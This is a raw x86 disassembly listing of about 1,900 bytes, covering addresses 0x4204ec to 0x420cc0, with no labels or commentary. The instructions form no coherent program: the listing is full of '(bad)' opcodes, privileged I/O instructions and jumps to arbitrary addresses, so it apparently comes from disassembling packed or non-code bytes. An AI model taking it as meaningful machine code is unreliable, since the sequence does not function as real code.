  4204ec:	mov    gs,ebp
  4204ee:	sub    BYTE PTR [edx+0x15dc429c],cl
  4204f4:	xchg   ecx,eax
  4204f5:	aam    0xf5
  4204f7:	daa    
  4204f8:	call   0xf830421b
  4204fd:	push   cs
  4204fe:	push   ss
  4204ff:	bound  edx,QWORD PTR [ebp-0x45996b0e]
  420505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420506:	hlt    
  420507:	push   0xd7d07d67
  42050c:	jl     0x420503
  42050e:	xor    al,0xa6
  420510:	jmp    0xfcdcf425
  420515:	sbb    DWORD PTR [eax-0x2bc7a340],edx
  42051b:	out    dx,eax
  42051c:	mov    edi,DWORD PTR [eax-0x12d91761]
  420522:	int3   
  420523:	add    al,0x6f
  420525:	xor    al,BYTE PTR [eax+0x7]
  420528:	or     ecx,DWORD PTR ds:0xe63684e6
  42052e:	xchg   ebp,eax
  42052f:	pop    ss
  420530:	(bad)  
  420531:	cmc    
  420532:	xor    cl,BYTE PTR [ebp-0x14]
  420535:	pop    es
  420536:	stos   BYTE PTR es:[edi],al
  420537:	push   ecx
  420538:	popf   
  420539:	shl    BYTE PTR [edx-0x5c],cl
  42053c:	and    bh,BYTE PTR [eax+0x56f6fd20]
  420542:	mov    ah,BYTE PTR [edi]
  420544:	lods   eax,DWORD PTR ds:[esi]
  420545:	xchg   edi,eax
  420546:	mov    cl,0x33
  420548:	fcmovnu st,st(4)
  42054a:	inc    eax
  42054b:	dec    edx
  42054c:	fwait
  42054d:	cmc    
  42054e:	sar    al,cl
  420550:	add    al,0x4a
  420552:	ss adc bl,bh
  420555:	fld    TBYTE PTR [ecx-0x75]
  420558:	sbb    al,0xd4
  42055a:	xchg   ecx,eax
  42055b:	and    BYTE PTR [edx-0x111e61e6],bh
  420561:	add    DWORD PTR [ecx],esi
  420563:	shr    BYTE PTR [eax],cl
  420565:	add    al,0xa5
  420567:	xor    BYTE PTR [eax+0x79652c9b],al
  42056d:	addr16 in eax,dx
  42056f:	call   FWORD PTR [ecx+0x69]
  420572:	fisubr DWORD PTR [edx+0x4b]
  420575:	lods   eax,DWORD PTR ds:[esi]
  420576:	mov    bh,0x61
  420578:	pop    esi
  420579:	call   0xb3da:0x8f060c88
  420580:	and    al,0x84
  420582:	mov    ch,0x3a
  420584:	jmp    0xf9d1:0x7546288f
  42058b:	pop    edx
  42058c:	mov    ds:0xc78b2991,eax
  420591:	dec    BYTE PTR [esi+0xd]
  420594:	mov    edi,0x1939bed5
  420599:	ins    BYTE PTR es:[edi],dx
  42059a:	(bad)  
  42059b:	rcl    esi,1
  42059d:	jle    0x4205d9
  42059f:	imul   BYTE PTR [ebx+0x48]
  4205a2:	mov    ecx,DWORD PTR [edi+0x5]
  4205a5:	lahf   
  4205a6:	test   al,0x11
  4205a8:	lods   eax,DWORD PTR ds:[esi]
  4205a9:	add    bh,BYTE PTR [edi+0x51]
  4205ac:	shl    DWORD PTR [ebp+0x68d9da89],cl
  4205b2:	call   0xfcb559d1
  4205b7:	clc    
  4205b8:	xchg   ebx,eax
  4205b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205ba:	sahf   
  4205bb:	mov    eax,esi
  4205bd:	adc    BYTE PTR [ebp+eax*2-0x73b98a75],bl
  4205c4:	and    al,0xa9
  4205c6:	fdiv   DWORD PTR [eax+0x0]
  4205c9:	push   edx
  4205ca:	inc    edi
  4205cb:	(bad)  
  4205cc:	inc    eax
  4205cd:	jnp    0x4205a0
  4205cf:	aas    
  4205d0:	loope  0x4205dd
  4205d2:	xchg   ebp,eax
  4205d3:	xchg   esi,eax
  4205d4:	call   0x97b3:0xd6aee2dd
  4205db:	xor    al,0xfb
  4205dd:	lods   eax,DWORD PTR ds:[esi]
  4205de:	enter  0x6b0,0xe8
  4205e2:	(bad)  
  4205e3:	jg     0x4205de
  4205e5:	jecxz  0x4205a7
  4205e7:	std    
  4205e8:	pop    ebp
  4205e9:	cmc    
  4205ea:	fnstenv [ecx]
  4205ec:	mov    dh,0x7e
  4205ee:	add    eax,0x16eef974
  4205f3:	fisttp DWORD PTR [eax-0x41]
  4205f6:	xchg   ah,ah
  4205f8:	jge    0x420666
  4205fa:	(bad)  
  4205fb:	jnp    0x42058d
  4205fd:	xor    ebx,DWORD PTR [esi]
  4205ff:	out    dx,al
  420600:	cmc    
  420601:	out    0x77,eax
  420603:	fwait
  420604:	push   eax
  420605:	dec    esi
  420606:	sub    esi,DWORD PTR [edx+edi*8]
  420609:	and    ch,dl
  42060b:	in     eax,dx
  42060c:	dec    DWORD PTR [edx-0x46]
  42060f:	adc    esp,ecx
  420611:	loope  0x42061e
  420613:	adc    al,0x18
  420615:	push   0xaf94aba9
  42061a:	test   al,0x22
  42061c:	dec    edi
  42061d:	out    dx,eax
  42061e:	outs   dx,BYTE PTR ds:[esi]
  42061f:	test   DWORD PTR [edx+0x373d77ef],eax
  420625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420626:	lds    esp,FWORD PTR [eax+0x67]
  420629:	lahf   
  42062a:	ds mov esi,0x38b6d138
  420630:	pop    esi
  420631:	pop    edx
  420632:	or     dl,BYTE PTR [ebx+0x96e3b5a]
  420638:	not    BYTE PTR [ebp-0x7f]
  42063b:	and    esi,esp
  42063d:	sbb    BYTE PTR [eax+0x76cee6a6],bl
  420643:	jno    0x42066a
  420645:	adc    al,0x94
  420647:	test   ch,dl
  420649:	add    al,0x2f
  42064b:	cdq    
  42064c:	sub    BYTE PTR [edi+0x7a],al
  42064f:	in     al,dx
  420650:	mov    eax,0x965e0238
  420655:	xchg   ebx,eax
  420656:	mov    ebp,DWORD PTR [esi+0x62317196]
  42065c:	adc    DWORD PTR [ebx+0x37],ebx
  42065f:	push   ds
  420660:	add    al,BYTE PTR [edi+eiz*4]
  420663:	stc    
  420664:	jnp    0x4205f3
  420666:	jle    0x4206e7
  420668:	fcomp  st(0)
  42066a:	jae    0x420618
  42066c:	mov    edx,0x7bd532c5
  420671:	cmp    ebx,DWORD PTR [ebx+0x45]
  420674:	sbb    al,0x5e
  420676:	inc    ecx
  420677:	push   ds
  420678:	or     al,0x9f
  42067a:	push   ebp
  42067b:	imul   eax,DWORD PTR [edx+eiz*4],0xff014058
  420682:	div    edi
  420684:	or     BYTE PTR [edx],dh
  420686:	jg     0x420611
  420688:	xor    BYTE PTR [eax-0x77f9592d],0xf5
  42068f:	shl    BYTE PTR [esi+0x7edfda06],1
  420695:	pop    ebx
  420696:	retf   0x87c
  420699:	inc    edx
  42069a:	push   ebp
  42069b:	mov    eax,0x3994f83
  4206a0:	(bad)  
  4206a1:	loope  0x420652
  4206a3:	push   esi
  4206a4:	ja     0x420675
  4206a6:	mov    ds:0x5bad448a,eax
  4206ab:	adc    eax,0x44ec738d
  4206b0:	add    al,0x41
  4206b2:	ret    
  4206b3:	cmp    dl,BYTE PTR [edi+0x7af7a382]
  4206b9:	dec    esi
  4206ba:	mov    al,dh
  4206bc:	sbb    al,0xeb
  4206be:	sahf   
  4206bf:	pop    esp
  4206c0:	das    
  4206c1:	push   ebx
  4206c2:	adc    al,0x22
  4206c4:	lods   al,BYTE PTR ds:[esi]
  4206c5:	add    esi,DWORD PTR [edi]
  4206c7:	jecxz  0x4206c2
  4206c9:	mov    al,ds:0x13496f6b
  4206ce:	or     al,0xd1
  4206d0:	dec    BYTE PTR [ebp+eiz*1+0x7]
  4206d4:	fsubr  DWORD PTR [edx]
  4206d6:	fs cmp eax,0xf1650f0c
  4206dc:	xchg   BYTE PTR ss:[edi],bh
  4206df:	add    esp,DWORD PTR [edx+0x77]
  4206e2:	push   0x863ec630
  4206e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206e8:	(bad)  
  4206e9:	cli    
  4206ea:	shr    BYTE PTR [ecx+0x31],0xff
  4206ee:	dec    eax
  4206ef:	mov    dl,0x95
  4206f1:	neg    DWORD PTR [edi+0x5f23a9a4]
  4206f7:	push   ds
  4206f8:	clc    
  4206f9:	add    al,0x1c
  4206fb:	std    
  4206fc:	ret    0x3933
  4206ff:	push   ebp
  420700:	xor    ebp,ebp
  420702:	call   0x1dc46df0
  420707:	xor    ecx,DWORD PTR [esi+0x765cd9b1]
  42070d:	outs   dx,BYTE PTR ds:[esi]
  42070e:	or     eax,0x4ccabb6
  420713:	shl    BYTE PTR [ebp+edx*2-0x79],cl
  420717:	test   BYTE PTR [esi],dl
  420719:	sub    bl,BYTE PTR ds:0xe1a21b4d
  42071f:	push   0x62c2ff7e
  420724:	ja     0x42076f
  420726:	leave  
  420727:	pop    ss
  420728:	pop    ds
  420729:	lods   eax,DWORD PTR ds:[esi]
  42072a:	ins    BYTE PTR es:[edi],dx
  42072b:	sahf   
  42072c:	jb     0x4206cb
  42072e:	data16 out 0x6f,al
  420731:	fisub  WORD PTR [ecx+0x18]
  420734:	sub    ah,BYTE PTR [esi+0x252cc29b]
  42073a:	dec    esi
  42073b:	dec    edx
  42073c:	mov    edx,DWORD PTR [si]
  42073f:	mov    al,ds:0xc23686fd
  420744:	dec    esi
  420745:	or     al,ah
  420747:	dec    ebx
  420748:	and    eax,0x9ef457b0
  42074d:	inc    eax
  42074e:	test   eax,0x8e8b7152
  420753:	sbb    cl,BYTE PTR [edx+0xc]
  420756:	mov    edx,DWORD PTR [ecx-0x75]
  420759:	das    
  42075a:	push   eax
  42075b:	pop    edi
  42075c:	push   ebp
  42075d:	in     al,dx
  42075e:	and    ebp,DWORD PTR [ebx+0x1f12840d]
  420764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420765:	sbb    BYTE PTR [ebp+ebp*8+0x5b],ah
  420769:	xchg   ecx,eax
  42076a:	push   0x7
  42076c:	je     0x4207ad
  42076e:	in     eax,dx
  42076f:	ss dec ebp
  420771:	add    esp,DWORD PTR [ebp+0x1f580b1f]
  420777:	add    BYTE PTR [eax-0x17],cl
  42077a:	dec    ebp
  42077b:	xchg   ebp,eax
  42077c:	in     eax,0x50
  42077e:	das    
  42077f:	in     al,dx
  420780:	add    eax,0x7202a0db
  420785:	pushf  
  420786:	mov    al,ds:0xa476964f
  42078b:	xor    edx,ecx
  42078d:	mov    dl,0x2a
  42078f:	mov    dh,ch
  420791:	dec    ecx
  420792:	cli    
  420793:	es mov esi,0x9fcf0fb6
  420799:	cmp    edi,DWORD PTR [edi-0x45]
  42079c:	xchg   esp,eax
  42079d:	jge    0x420752
  42079f:	push   ss
  4207a0:	mov    dl,0xa9
  4207a2:	fdivr  DWORD PTR [ebp-0x55897a16]
  4207a8:	cmp    al,0xc3
  4207aa:	dec    edx
  4207ab:	sahf   
  4207ac:	pop    ss
  4207ad:	inc    esi
  4207ae:	test   eax,0xd1beac48
  4207b3:	mov    esi,0x6b6a5c50
  4207b8:	and    eax,0x56b07ebd
  4207bd:	outs   dx,BYTE PTR ds:[esi]
  4207be:	and    ebx,DWORD PTR [ebx-0x1e]
  4207c1:	aad    0xe7
  4207c3:	push   eax
  4207c4:	pusha  
  4207c5:	inc    ecx
  4207c6:	inc    ecx
  4207c7:	test   al,0x3d
  4207c9:	xchg   bl,ch
  4207cb:	enter  0x3b20,0xfd
  4207cf:	mov    ecx,0x9b6839fb
  4207d4:	mov    ebx,DWORD PTR [eax-0x2bf06e9c]
  4207da:	adc    eax,0x162f0121
  4207df:	test   eax,0x1b412f89
  4207e4:	sbb    cl,BYTE PTR [edi+0x39]
  4207e7:	jge    0x42080d
  4207e9:	mov    eax,0x298de0cb
  4207ee:	arpl   WORD PTR [esi+0xa40017d],ax
  4207f4:	(bad)  
  4207f5:	pop    esp
  4207f6:	mov    ds:0x842037ef,eax
  4207fb:	sub    BYTE PTR [edi+0x29796f0a],al
  420801:	fstp   TBYTE PTR [esi]
  420803:	(bad)  
  420804:	push   edx
  420805:	adc    dh,BYTE PTR [ebx-0x1c]
  420808:	popa   
  420809:	mov    edx,0x2c427085
  42080e:	outs   dx,BYTE PTR ds:[esi]
  42080f:	stos   DWORD PTR es:[edi],eax
  420810:	sub    BYTE PTR [ecx],0xa3
  420813:	nop
  420814:	lds    ecx,FWORD PTR [edi-0x49]
  420817:	push   ss
  420818:	fst    QWORD PTR [eax]
  42081a:	int    0x5e
  42081c:	dec    edi
  42081d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42081e:	iret   
  42081f:	cli    
  420820:	push   edi
  420821:	jno    0x42083e
  420823:	jp     0x4207e3
  420825:	arpl   WORD PTR [edx-0x1e],si
  420828:	mov    ecx,0xcb5fa2f6
  42082d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42082e:	sub    eax,0x3cd5096a
  420833:	push   edi
  420834:	xor    edi,edx
  420836:	sar    DWORD PTR [ebx+0x17],0x68
  42083a:	sbb    eax,0xcc6c8015
  42083f:	jl     0x42081a
  420841:	div    BYTE PTR [edi+0x75a6dc89]
  420847:	std    
  420848:	in     eax,0xef
  42084a:	xchg   DWORD PTR [edx],eax
  42084c:	mov    esi,0x6002ca87
  420851:	cmp    DWORD PTR [ebp-0x73],0xffffffbb
  420855:	xchg   ecx,eax
  420856:	imul   edx,DWORD PTR [ebx-0x2120e847],0x1a
  42085d:	xor    BYTE PTR [ecx+0x25],bh
  420860:	mov    ds:0xcfe97b56,al
  420865:	aad    0xad
  420867:	in     ax,0x10
  42086a:	jle    0x420872
  42086c:	pusha  
  42086d:	mov    esi,0x5a77d866
  420872:	and    DWORD PTR [esi-0x43],ebp
  420875:	cli    
  420876:	fwait
  420877:	jg     0x4208b5
  420879:	add    DWORD PTR ds:0xc43e0dce,edx
  42087f:	fwait
  420880:	inc    esp
  420881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420882:	adc    BYTE PTR [ecx+0x7d2ded83],ch
  420888:	jo     0x420816
  42088a:	sub    eax,0xe0bf6791
  42088f:	rol    dh,0xf8
  420892:	push   edx
  420893:	data16 clc 
  420895:	pusha  
  420896:	(bad)  
  420898:	pop    esi
  420899:	cmp    eax,0x5f39533e
  42089e:	cmp    eax,0x9ebe44b6
  4208a3:	and    eax,0xef8a18bd
  4208a8:	stc    
  4208a9:	sbb    dh,ch
  4208ab:	cmc    
  4208ac:	push   esp
  4208ad:	fistp  QWORD PTR [edx+0x21c7cd16]
  4208b3:	add    DWORD PTR [esi],edi
  4208b5:	ret    0x2fff
  4208b8:	jg     0x420899
  4208ba:	ds jo  0x4208ef
  4208bd:	sbb    edi,esp
  4208bf:	dec    ebp
  4208c0:	cmp    eax,0xe5bb29f1
  4208c5:	test   eax,0x14838895
  4208ca:	imul   ebp,DWORD PTR [edi+0x1b965d6b],0xffffffcf
  4208d1:	aam    0x1e
  4208d3:	repz loope 0x42092d
  4208d6:	or     DWORD PTR [esp+edx*1+0x28dc1fbb],ebx
  4208dd:	outs   dx,BYTE PTR ds:[esi]
  4208de:	aaa    
  4208df:	push   es
  4208e0:	pop    ecx
  4208e1:	pop    esi
  4208e2:	test   al,0x5b
  4208e4:	popf   
  4208e5:	ficom  WORD PTR [eax]
  4208e7:	inc    ecx
  4208e8:	punpckldq mm3,DWORD PTR [eax]
  4208eb:	in     al,dx
  4208ec:	mov    al,0x2a
  4208ee:	icebp  
  4208ef:	sub    esp,ecx
  4208f1:	jecxz  0x4208e8
  4208f3:	sub    BYTE PTR [ebx-0x26],0xd0
  4208f7:	aas    
  4208f8:	ret    
  4208f9:	fidiv  DWORD PTR [ebx+edx*2-0x7d]
  4208fd:	popa   
  4208fe:	inc    esp
  4208ff:	sub    DWORD PTR [ecx+edi*8-0x71ffa7fb],edi
  420906:	int    0x2e
  420908:	xor    BYTE PTR [eax+0x58],dl
  42090b:	xor    al,0x25
  42090d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42090e:	(bad)  
  420910:	adc    DWORD PTR [eax+edi*8-0x21],esp
  420914:	popf   
  420915:	fisub  WORD PTR [esi-0x3b8bb236]
  42091b:	out    dx,eax
  42091c:	arpl   WORD PTR [edx+ebx*1+0x1953a00f],si
  420923:	movsx  ebp,BYTE PTR [edx]
  420926:	sbb    eax,0x7d715bdd
  42092b:	mov    edi,0x96d4f25
  420930:	add    al,0x7a
  420932:	or     ebx,DWORD PTR ss:[ebx]
  420935:	dec    ebp
  420936:	cdq    
  420937:	(bad)  
  420938:	(bad)  
  420939:	outs   dx,BYTE PTR ds:[esi]
  42093a:	xchg   ecx,eax
  42093b:	and    ecx,DWORD PTR [ebp-0x1e93ed6b]
  420941:	popa   
  420942:	fsubr  QWORD PTR [esi-0x19]
  420945:	into   
  420946:	adc    DWORD PTR [eax+0x5f866da5],ebp
  42094c:	rol    BYTE PTR [ebx+0x393f28fd],cl
  420952:	(bad)  [ebx]
  420954:	sub    DWORD PTR [esi-0x38],edi
  420957:	(bad)  
  420958:	lock ret 
  42095a:	pop    esi
  42095b:	loop   0x42098e
  42095d:	inc    edi
  42095e:	lods   al,BYTE PTR ds:[esi]
  42095f:	popa   
  420960:	xchg   esi,eax
  420961:	out    0xbd,al
  420963:	or     BYTE PTR [ebx-0x19bd21be],ah
  420969:	xchg   DWORD PTR [eax+0x57c22675],edx
  42096f:	mov    bl,0x84
  420971:	in     eax,0x30
  420973:	dec    ebx
  420974:	or     al,0x36
  420976:	adc    al,0x73
  420978:	xchg   esp,eax
  420979:	cld    
  42097a:	dec    esp
  42097b:	mov    ah,0x81
  42097d:	popa   
  42097e:	fild   DWORD PTR [ecx+0x1c]
  420981:	(bad)  
  420983:	jae    0x4209d1
  420985:	or     BYTE PTR [ebx+0x17e938ca],bh
  42098b:	jl     0x420936
  42098d:	mov    es,WORD PTR [eax+0x5a33cdc3]
  420993:	sbb    ah,BYTE PTR [ebx+ecx*4-0x21]
  420997:	inc    esi
  420998:	mov    ebx,0xdb781794
  42099d:	aad    0xad
  42099f:	add    ebx,DWORD PTR [edi-0x2e]
  4209a2:	mov    ds:0x94a7a6d6,eax
  4209a7:	retf   
  4209a8:	sbb    al,0xe7
  4209aa:	jne    0x420968
  4209ac:	xor    ch,BYTE PTR fs:[edx-0x78]
  4209b0:	inc    ecx
  4209b1:	or     al,0xd
  4209b3:	jge    0x42098b
  4209b5:	retf   
  4209b6:	jo     0x4209f0
  4209b8:	lea    esp,[esp+0x8]
  4209bc:	test   DWORD PTR [ebp+0xd],eax
  4209bf:	cwde   
  4209c0:	add    dh,BYTE PTR [esi]
  4209c2:	out    dx,al
  4209c3:	repnz sub BYTE PTR [eax+0x67],bh
  4209c7:	sub    BYTE PTR [ebp+0x63d6938a],0x9a
  4209ce:	(bad)  
  4209cf:	rsm    
  4209d1:	adc    bh,cl
  4209d3:	inc    edi
  4209d4:	sub    eax,DWORD PTR [edi-0x2f585e82]
  4209da:	aam    0xa
  4209dc:	cmp    edi,DWORD PTR [ecx]
  4209de:	dec    edx
  4209df:	sahf   
  4209e0:	cld    
  4209e1:	dec    edx
  4209e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209e3:	pushf  
  4209e4:	and    DWORD PTR es:[ebx],0x4f
  4209e8:	cmp    eax,0x48342e19
  4209ed:	ds je  0x420a0f
  4209f0:	test   al,0xf2
  4209f2:	fiadd  WORD PTR [ebx]
  4209f4:	jg     0x4209c7
  4209f6:	mov    ecx,ss
  4209f8:	add    dh,BYTE PTR [esi-0x1b]
  4209fb:	imul   BYTE PTR [eax+ebp*2+0x53cf82fb]
  420a02:	hlt    
  420a03:	xchg   ecx,eax
  420a04:	xchg   edx,eax
  420a05:	(bad)  
  420a06:	mov    DWORD PTR [eax],ecx
  420a08:	sbb    bl,BYTE PTR ds:0xc90b9ac5
  420a0e:	lds    edx,FWORD PTR [ebx-0x59d6c255]
  420a14:	mov    eax,0x86922c1
  420a19:	test   DWORD PTR ds:0x3a636772,0x79e37450
  420a23:	add    ah,BYTE PTR [eax+0xa]
  420a26:	adc    al,0xa6
  420a28:	and    DWORD PTR [esi],ecx
  420a2a:	mov    esi,0x82c006c1
  420a2f:	mov    dh,0x1a
  420a31:	adc    DWORD PTR [ebx+0x73],esi
  420a34:	ret    0x86cc
  420a37:	or     BYTE PTR [ecx],bl
  420a39:	inc    esi
  420a3a:	retf   0x2073
  420a3d:	sbb    eax,0xb51e5967
  420a42:	les    ebx,FWORD PTR [eax+0x212e733f]
  420a48:	ret    0x55fc
  420a4b:	xor    edi,edx
  420a4d:	(bad)  
  420a4e:	test   BYTE PTR [esi-0x43],bh
  420a51:	pushf  
  420a52:	sub    al,0x8d
  420a54:	sbb    dh,BYTE PTR [ebp-0x7c17844c]
  420a5a:	xchg   ecx,eax
  420a5b:	test   al,0xed
  420a5d:	jne    0x4209df
  420a5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a60:	rcr    DWORD PTR [ebx-0x11cd1000],0xa5
  420a67:	stos   BYTE PTR es:[edi],al
  420a68:	into   
  420a69:	mov    cl,0x11
  420a6b:	pop    edx
  420a6c:	rcr    bh,cl
  420a6e:	xchg   esp,eax
  420a6f:	outs   dx,BYTE PTR ds:[esi]
  420a70:	(bad)  
  420a71:	cs jecxz 0x420a1a
  420a74:	xchg   DWORD PTR [ebx+0x5509a84d],ebx
  420a7a:	jl     0x420a28
  420a7c:	ret    0x9991
  420a7f:	pop    ds
  420a80:	(bad)  
  420a81:	test   eax,0x19b78c17
  420a86:	or     ch,bl
  420a88:	jmp    0x420a69
  420a8a:	out    dx,al
  420a8b:	sbb    BYTE PTR [eax-0x2a632ea1],dh
  420a91:	in     eax,0xca
  420a93:	push   0x6d16dc8c
  420a98:	sbb    bl,al
  420a9a:	ffree  st(7)
  420a9c:	and    edx,DWORD PTR [ebx]
  420a9e:	dec    esi
  420a9f:	jmp    0xbb2f8a32
  420aa4:	inc    ebx
  420aa5:	scas   al,BYTE PTR es:[edi]
  420aa6:	sbb    eax,0x5da71af2
  420aab:	mov    ebx,0x2ba2e042
  420ab0:	adc    al,0xec
  420ab2:	outs   dx,BYTE PTR ds:[esi]
  420ab3:	test   eax,0x6a068723
  420ab8:	cmp    ebp,DWORD PTR [ebp+0x24]
  420abb:	imul   ebp,DWORD PTR [edx+edi*1-0x2bd1dc20],0xd189c4ce
  420ac6:	outs   dx,BYTE PTR ds:[esi]
  420ac7:	cmp    DWORD PTR [edx+0x1d],ebx
  420aca:	xchg   esp,eax
  420acb:	repz cmc 
  420acd:	mov    al,ds:0x6d5a019b
  420ad2:	out    0x55,eax
  420ad4:	push   0xffffffb0
  420ad6:	call   0xd8dd626b
  420adb:	adc    al,0xda
  420add:	cwde   
  420ade:	pop    edx
  420adf:	das    
  420ae0:	lea    eax,[ecx]
  420ae2:	sub    al,bl
  420ae4:	in     eax,dx
  420ae5:	dec    ebp
  420ae6:	aaa    
  420ae7:	mov    cl,0x7f
  420ae9:	pusha  
  420aea:	or     BYTE PTR [eax+0x3d],dh
  420aed:	(bad)  
  420aee:	cmp    ebp,ecx
  420af0:	cmp    ecx,DWORD PTR [ecx-0x4d37e8fe]
  420af6:	push   ebp
  420af8:	pushf  
  420af9:	ret    0xc96d
  420afc:	aas    
  420afd:	push   ecx
  420afe:	fcmovnbe st,st(3)
  420b00:	xchg   ebx,eax
  420b01:	sbb    DWORD PTR [edx+eiz*2],eax
  420b04:	sbb    eax,0x704ba317
  420b09:	push   ebp
  420b0a:	adc    al,0xb5
  420b0c:	mov    cl,0x93
  420b0e:	inc    esp
  420b0f:	pushf  
  420b10:	cmc    
  420b11:	fcmovne st,st(4)
  420b13:	xchg   ebx,eax
  420b14:	sbb    dl,ch
  420b16:	pop    ds
  420b17:	cmp    eax,0xc66d085c
  420b1c:	jnp    0x420aa1
  420b1e:	(bad)  
  420b1f:	das    
  420b20:	and    eax,0xbb709e15
  420b25:	fsub   st(1),st
  420b27:	fnsave [ebx]
  420b29:	dec    ebx
  420b2a:	fmul   QWORD PTR [edi+0x74]
  420b2d:	cmp    BYTE PTR [esi+0x31],dl
  420b30:	push   ds
  420b31:	sub    edi,DWORD PTR [edx-0x60]
  420b34:	or     DWORD PTR ds:0x3107a2d5,esp
  420b3a:	ficomp DWORD PTR [ebp-0x74c30250]
  420b40:	jmp    0xb5d9:0x63a0420c
  420b47:	inc    eax
  420b48:	and    al,0x57
  420b4a:	or     ah,BYTE PTR [edx-0x27f06a41]
  420b50:	pop    ds
  420b51:	cdq    
  420b52:	or     esp,ebp
  420b54:	stc    
  420b55:	pop    eax
  420b56:	xor    esi,DWORD PTR [ebx]
  420b58:	fst    QWORD PTR [edi+0x21]
  420b5b:	and    ebx,0xffffffde
  420b5e:	loop   0x420b5a
  420b60:	pusha  
  420b61:	push   esi
  420b62:	outs   dx,BYTE PTR ds:[esi]
  420b63:	add    edi,edx
  420b65:	inc    ecx
  420b66:	test   bl,bh
  420b68:	mov    esp,0xe822d372
  420b6d:	stos   DWORD PTR es:[edi],eax
  420b6e:	call   0xddee:0xa67dcd69
  420b75:	push   eax
  420b76:	mov    eax,ds:0x2a783bc7
  420b7b:	jmp    DWORD PTR [ecx+ebp*1+0x63]
  420b7f:	int    0x44
  420b81:	mov    bh,0x18
  420b83:	mov    ebx,0x4a91d14b
  420b88:	xchg   BYTE PTR [edx],dh
  420b8a:	mov    edx,0x8c2d99c9
  420b8f:	and    al,0xfb
  420b91:	xchg   edi,eax
  420b92:	fimul  DWORD PTR [ebp-0x339c9269]
  420b98:	mov    ah,0xbd
  420b9a:	sti    
  420b9b:	adc    DWORD PTR [eax-0x77],0xf2dbe717
  420ba2:	out    0xe5,al
  420ba4:	xlat   BYTE PTR ds:[ebx]
  420ba5:	cmp    BYTE PTR [ebx-0x2a],0xd0
  420ba9:	adc    eax,0xb5e0010
  420baf:	add    ah,BYTE PTR [edi]
  420bb1:	sti    
  420bb2:	aam    0x5a
  420bb4:	push   edi
  420bb5:	jg     0x420bc6
  420bb7:	inc    edi
  420bb8:	dec    eax
  420bb9:	xlat   BYTE PTR ds:[ebx]
  420bba:	maxps  xmm7,XMMWORD PTR [ebp+0x4baeabdb]
  420bc1:	test   BYTE PTR ds:0xc4cdc19b,ah
  420bc7:	mov    ebp,0xe66505f1
  420bcc:	ret    0xf269
  420bcf:	jo     0x420bb3
  420bd1:	in     eax,0x5b
  420bd3:	pop    ss
  420bd4:	mov    ch,0x3f
  420bd6:	addr16 dec edx
  420bd8:	cmp    eax,0x73164444
  420bdd:	jmp    0x11888b5
  420be2:	ret    
  420be3:	or     BYTE PTR [ecx+0x56],ch
  420be6:	lods   al,BYTE PTR ds:[esi]
  420be7:	call   0xb8e45228
  420bec:	(bad)  
  420bed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bee:	clc    
  420bef:	cld    
  420bf0:	imul   ebx,edx,0xe8d9deb1
  420bf6:	sub    dh,ch
  420bf8:	es jp  0x420bdc
  420bfb:	arpl   bx,dx
  420bfd:	(bad)  
  420bfe:	cmc    
  420bff:	or     al,0x5e
  420c01:	sbb    BYTE PTR [edi],dl
  420c03:	int    0x87
  420c05:	stos   BYTE PTR es:[edi],al
  420c06:	xchg   dh,bh
  420c08:	cmp    DWORD PTR [ebp+0x1af98d6f],0xc08a999
  420c12:	add    DWORD PTR [ebx+0x265a9db5],esi
  420c18:	add    dh,al
  420c1a:	ds and al,dh
  420c1d:	sbb    ecx,esi
  420c1f:	int    0x90
  420c21:	ret    0x97fb
  420c24:	dec    ebp
  420c25:	cdq    
  420c26:	and    ah,BYTE PTR cs:[ebx+edi*4+0x3e]
  420c2b:	imul   esi,edx,0xf544e4fd
  420c31:	mov    WORD PTR [eax-0x4cb5e0b2],fs
  420c37:	pop    esi
  420c38:	inc    ebp
  420c39:	ds cmp al,0xe8
  420c3c:	or     DWORD PTR [edx],esi
  420c3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c3f:	sbb    BYTE PTR [edi],0x5
  420c42:	scas   eax,DWORD PTR es:[edi]
  420c43:	inc    ecx
  420c44:	sbb    bl,BYTE PTR [ecx-0x1e]
  420c47:	(bad)  [ecx+0x5a5831e1]
  420c4d:	pop    ecx
  420c4e:	or     ebp,edx
  420c50:	mov    dh,0x30
  420c52:	pop    edx
  420c53:	sahf   
  420c54:	jo     0x420c80
  420c56:	lds    edi,FWORD PTR [esi+0x3a]
  420c59:	test   BYTE PTR [eax+eiz*1+0x42],al
  420c5d:	aaa    
  420c5e:	mov    ebp,0x473f80d4
  420c63:	pop    ebp
  420c64:	ss pop ebx
  420c66:	inc    ebp
  420c67:	push   ebx
  420c68:	pop    edx
  420c69:	mov    esi,0x77787742
  420c6e:	loop   0x420c40
  420c70:	mov    al,0x44
  420c72:	mov    cl,0xa6
  420c74:	sahf   
  420c75:	adc    BYTE PTR es:[ecx+ebp*2+0x12],dh
  420c7a:	hlt    
  420c7b:	mov    ebx,0x6faad777
  420c80:	fs mov edi,0x6ac1f4af
  420c86:	sub    eax,0x28f4fde0
  420c8b:	inc    ecx
  420c8c:	imul   eax,DWORD PTR [edi+0x30],0x11
  420c90:	fisubr DWORD PTR [ebx+0x25363c1d]
  420c96:	xlat   BYTE PTR ds:[ebx]
  420c97:	adc    al,0x9c
  420c99:	cmp    ecx,DWORD PTR [edi-0x51]
  420c9c:	lods   al,BYTE PTR ds:[esi]
  420c9d:	sbb    al,0x5
  420c9f:	push   eax
  420ca0:	sub    edi,eax
  420ca2:	pop    edi
  420ca3:	mov    ebx,0xf925da08
  420ca8:	test   DWORD PTR [ebx+0x4],0xb44d0559
  420caf:	cmp    eax,0x846c18f9
  420cb4:	and    eax,0x6aba0615
  420cb9:	inc    ebx
  420cba:	dec    esp
  420cbb:	ret    
  420cbc:	outs   dx,DWORD PTR ds:[esi]
  420cbd:	in     al,0xa0
  420cbf:	(bad)  
  420cc0:	pop    edx
